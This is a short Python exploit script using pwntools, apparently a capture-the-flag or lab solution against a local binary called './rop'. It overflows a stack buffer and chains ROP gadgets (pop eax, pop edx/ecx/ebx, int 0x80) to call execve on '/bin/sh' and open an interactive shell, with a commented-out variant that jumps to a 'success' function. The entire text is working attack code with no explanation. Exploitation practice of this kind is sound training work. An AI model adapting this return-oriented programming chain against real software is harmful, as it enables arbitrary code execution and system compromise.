from pwn import *

# Ubuntu is doing lots of buffering on its own
# ref: https://stackoverflow.com/a/58450927/7615195
pty = process.PTY

proc = process('./rop', stdin=pty, stdout=pty)

pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x080be408

addr_ebp = 0xffffd0f8
addr_inp = 0xffffd08c
nr_syscall_execve = 0xb

payload = flat(b'A' * (addr_ebp - addr_inp + 4), pop_eax_ret, nr_syscall_execve, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80) 
# success_addr = 0x08049186
# payload = b'a' * 0x14 + b'a' * 0x4 + p32(success_addr)
proc.sendline(payload)
proc.interactive()
